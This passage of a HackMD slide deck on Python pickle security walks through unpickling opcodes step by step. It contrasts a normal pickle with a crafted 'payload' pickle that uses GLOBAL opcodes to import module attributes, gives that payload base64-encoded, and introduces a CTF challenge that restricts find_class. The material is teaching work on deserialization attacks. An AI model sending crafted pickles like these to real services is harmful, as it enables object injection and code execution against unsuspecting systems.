</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/64"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">65</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/65&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;66&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">X\x08\x00\x00\x00category
q\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINUNICODE Push a Python Unicode string object.

Byte: b'X'
Stack: ['name', 'x']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name', 4: 'x'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/65"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">66</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/66&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;67&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x05
X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack is not popped.

Byte: b'q'
Stack: ['name', 'x', 'category']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name', 4: 'x'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/66"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">67</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/67&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;68&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">X\x01\x00\x00\x00y
q\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINUNICODE Push a Python Unicode string object.

Byte: b'X'
Stack: ['name', 'x', 'category']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name', 4: 'x', 5: 'category'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/67"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">68</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/68&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;69&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x06
ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack is not popped.

Byte: b'q'
Stack: ['name', 'x', 'category', 'y']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name', 4: 'x', 5: 'category'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/68"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">69</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/69&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;70&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">u
b.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">SETITEMS Add an arbitrary number of
key+value pairs to an existing dict.

Byte: b'u'
Stack: ['name', 'x', 'category', 'y']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name', 4: 'x', 5: 'category', 6: 'y'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/69"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">70</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/70&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;71&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">b
.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BUILD Finish building an object
via __setstate__ or dict update.

Byte: b'b'
Stack: [Animal(name=None, category=None), {'name': 'x', 'category': 'y'}]
Meta Stack: []
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {'name': 'x', 'category': 'y'}, 3: 'name', 4: 'x', 5: 'category', 6: 'y'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/70"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">71</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 229.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/71&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;72&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">STOP Stop the unpickling machine.

Byte: b'.'
Stack: [Animal(name='x', category='y')]
Meta Stack: []
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name='x', category='y'), 2: {'name': 'x', 'category': 'y'}, 3: 'name', 4: 'x', 5: 'category', 6: 'y'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/71"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">72</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 277px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/72&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;73&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">The value left on the top of the stack will be regard as the return value to loads</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Animal(name=“x”, category=“y”)</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/72"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">73</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 184.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/73&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;74&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">What if we import <a href="http://favorite.name/" target="_blank" rel="noopener">favorite.name</a> as name and favorite.category as category?</h4>
<ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">OPCODE q makes no sense in this case, so let’s just omit it.</li>
</ul>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-comment"># favorite.py</span>
name = <span class="hljs-string">'lilac'</span>
category = <span class="hljs-string">'calil'</span>
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/73"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">74</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/74&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;75&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">X\x04\x00\x00\x00name
q\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINUNICODE Push a Python Unicode string object.

Byte: b'X'
Stack: []
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/74"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">75</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/75&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;76&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">cfavorite\nname\n
q\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">GLOBAL Push a global object (module.attr) on the stack.

Byte: b'c'
Stack: ['name']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/75"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">76</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/76&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;77&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">X\x08\x00\x00\x00category
q\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINUNICODE Push a Python Unicode string object.

Byte: b'X'
Stack: ['name', 'lilac']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name', 4: 'lilac'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/76"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">77</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/77&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;78&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">cfavorite\ncategory\n
q\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINUNICODE Push a Python Unicode string object.

Byte: b'c'
Stack: ['name', 'lilac', 'category']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name', 4: 'lilac', 5: 'category'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/77"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">78</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/78&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;79&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">u
b.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">SETITEMS Add an arbitrary number of
key+value pairs to an existing dict.

Byte: b'u'
Stack: ['name', 'lilac', 'category', 'calil']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name', 4: 'lilac', 5: 'category', 6: 'calil'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/78"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">79</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 119px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/79&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;80&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Normal Animal</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">$ python3 -m pickletools ./payload
    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span>
    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">'__main__ Animal'</span>
   <span class="hljs-number">19</span>: q    BINPUT     <span class="hljs-number">0</span>
   <span class="hljs-number">21</span>: )    EMPTY_TUPLE
   <span class="hljs-number">22</span>: \x81 NEWOBJ
   <span class="hljs-number">23</span>: q    BINPUT     <span class="hljs-number">1</span>
   <span class="hljs-number">25</span>: }    EMPTY_DICT
   <span class="hljs-number">26</span>: q    BINPUT     <span class="hljs-number">2</span>
   <span class="hljs-number">28</span>: (    MARK
   <span class="hljs-number">29</span>: X        BINUNICODE <span class="hljs-string">'name'</span>
   <span class="hljs-number">38</span>: q        BINPUT     <span class="hljs-number">3</span>
   <span class="hljs-number">40</span>: X        BINUNICODE <span class="hljs-string">'x'</span>
   <span class="hljs-number">46</span>: q        BINPUT     <span class="hljs-number">4</span>
   <span class="hljs-number">48</span>: X        BINUNICODE <span class="hljs-string">'category'</span>
   <span class="hljs-number">61</span>: q        BINPUT     <span class="hljs-number">5</span>
   <span class="hljs-number">63</span>: X        BINUNICODE <span class="hljs-string">'y'</span>
   <span class="hljs-number">69</span>: q        BINPUT     <span class="hljs-number">6</span>
   <span class="hljs-number">71</span>: u        SETITEMS   (MARK at <span class="hljs-number">28</span>)
   <span class="hljs-number">72</span>: b    BUILD
   <span class="hljs-number">73</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">2</span>
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/79"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">80</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 119px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/80&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;81&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Payload Animal</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="bash hljs">$ python3 -m pickletools ./y        
    0: \x80 PROTO      3
    2: c    GLOBAL     <span class="hljs-string">'__main__ Animal'</span>
   19: q    BINPUT     0
   21: )    EMPTY_TUPLE
   22: \x81 NEWOBJ
   23: q    BINPUT     1
   25: }    EMPTY_DICT
   26: q    BINPUT     2
   28: (    MARK
   29: X        BINUNICODE <span class="hljs-string">'name'</span>
   38: q        BINPUT     3
   40: c        GLOBAL     <span class="hljs-string">'favorite name'</span>
   55: q        BINPUT     4
   57: X        BINUNICODE <span class="hljs-string">'category'</span>
   70: q        BINPUT     5
   72: c        GLOBAL     <span class="hljs-string">'favorite category'</span>
   91: q        BINPUT     6
   93: u        SETITEMS   (MARK at 28)
   94: b    BUILD
   95: .    STOP
highest protocol among opcodes = 2

</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/80"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">81</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 325.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/81&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;82&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="bash hljs">gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA2NmYXZvcml0ZQpuYW1lCnEEWAgAAABjYXRlZ29yeXEFY2Zhdm9yaXRlCmNhdGVnb3J5CnEGdWIu
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/81"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">82</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 195.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/82&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;83&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/3qdYpaz.png" alt="" class="" data-position="NaN" data-size="36"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/82"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">83</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 192.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/83&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;84&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN"><a href="http://web.hitctf.cn:10019/" target="_blank" rel="noopener">2019-SJTU-Pickle-Revenge</a></h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span>
        <span class="hljs-keyword">if</span> module == <span class="hljs-string">'__main__'</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[<span class="hljs-string">'__main__'</span>], name)
        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">"global '%s.%s' is forbidden"</span> % (module, name))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restricted_loads</span>(<span class="hljs-params">s</span>):</span>
    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/83"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">84</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 123.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/84&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;85&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">find_class</h2>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span>
    <span class="hljs-comment"># Subclasses may override this.</span>
    sys.audit(<span class="hljs-string">'pickle.find_class'</span>, module, name)
    <span class="hljs-keyword">if</span> self.proto &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> self.fix_imports:
        <span class="hljs-keyword">if</span> (module, name) <span class="hljs-keyword">in</span> _compat_pickle.NAME_MAPPING:
            module, name = _compat_pickle.NAME_MAPPING[(module, name)]
        <span class="hljs-keyword">elif</span> module <span class="hljs-keyword">in</span> _compat_pickle.IMPORT_MAPPING:
            module = _compat_pickle.IMPORT_MAPPING[module]
    <span class="hljs-built_in">__import__</span>(module, level=<span class="hljs-number">0</span>)
    <span class="hljs-keyword">if</span> self.proto &gt;= <span class="hljs-number">4</span>:
        <span class="hljs-keyword">return</span> _getattribute(sys.modules[module], name)[<span class="hljs-number">0</span>]
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[module], name)
</code></pre>
